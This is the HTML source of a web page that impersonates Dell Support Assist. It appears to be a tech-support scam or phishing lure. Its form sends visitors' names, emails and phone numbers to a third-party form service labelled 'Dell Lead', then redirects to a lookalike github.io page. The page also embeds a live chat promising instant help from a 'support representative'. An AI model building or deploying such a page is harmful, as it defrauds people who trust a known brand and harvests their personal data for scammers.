<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Dell</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <!-- Materialize CSS -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css" rel="stylesheet">

  <!-- Icons -->
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  <style>
    body {
      background: #f5f7fa;
    }

    nav {
      background-color: #ffffff;
    }

    .brand-logo img {
      height: 38px;
      margin-top: 12px;
      margin-right: 10px;
    }

    .hero {
      background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
      url('https://i.dell.com/sites/csimages/Video_Imagery/all/e-support-thumbnail.jpg');
      background-size: cover;
      background-position: center;
      padding: 110px 20px;
      text-align: center;
      color: white;
    }

    .form-card {
      margin-top: -70px;
    }

    .btn-main {
      background-color: #0000FF;
    }

    .btn-main:hover {
      background-color: #a52d28;
    }

    .icon-color {
      color: #0000FF;
    }

    .how-section {
      background: #eef2f5;
      padding: 60px 20px;
      margin-top: 30px;
    }

    .chat-section {
      background: linear-gradient(135deg, #2563eb, #3b82f6);
      padding: 70px 20px;
      color: white;
      text-align: center;
    }

    footer {
      background-color: #ffffff !important;
    }
  </style>

<!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = 'b1937b836dadbde1d729303dd3bf8876732a22ee';
window.smartsupp||(function(d) {
  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
  c.type='text/javascript';c.charset='utf-8';c.async=true;
  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
})(document);
</script>

</head>

<body>

<!-- NAVBAR -->
<nav>
  <div class="nav-wrapper container">
    <a href="#" class="brand-logo black-text">
      <img src="https://dellsystemspage.github.io/login/delllogo.PNG">
    </a>
  </div>
</nav>

<!-- HERO -->
<div class="hero">
  <h3>Dell Technologies</h3>
  <p>Progress Made Real.</p>
</div>

<!-- FORM -->
<div class="container form-card">
  <div class="card z-depth-3">
    <div class="card-content">
      <span class="card-title"><b>Get Started With Dell Support Assist</b></span>

      <form action="https://api.web3forms.com/submit" method="POST">

        <!-- ACCESS KEY -->
        <input type="hidden" name="access_key" value="0dc844cf-3810-4248-984d-8442ac402a70">

        <!-- SUBJECT -->
        <input type="hidden" name="subject" value="Dell Lead">

        <!-- REDIRECT -->
        <input type="hidden" name="redirect" value="https://dellsystempage.github.io/loading.html">

        <!-- NAME -->
        <div class="input-field col s12">
          <input name="name" type="text" required>
          <label>Full Name</label>
        </div>

        <!-- EMAIL -->
        <div class="input-field col s12">
          <input name="email" type="email" required>
          <label>Email Address</label>
        </div>

        <!-- PHONE -->
        <div class="input-field col s12">
          <input name="phone" type="tel" required>
          <label>Phone Number</label>
        </div>

        <!-- BUTTON -->
        <div class="col s12 center">
          <button class="btn waves-effect waves-light btn-main" type="submit">
            Get Started
            <i class="material-icons right">send</i>
          </button>
        </div>

      </form>

    </div>
  </div>
</div>

<!-- CHAT -->
<div class="chat-section">
  <h4>Need Immediate Help?</h4>
  <p>Chat with our support representative and resolve your issue instantly.</p>
  <a class="btn white red-text waves-effect waves-light"
     onclick="smartsupp('chat:open')">
    Chat Now
  </a>
</div>

<!-- FOOTER -->
<footer class="page-footer" style="background-color:#ffffff !important;">
  <div class="container center" style="color:#000000 !important;">
    © 2026 Dell Docs
  </div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>

</body>
</html>
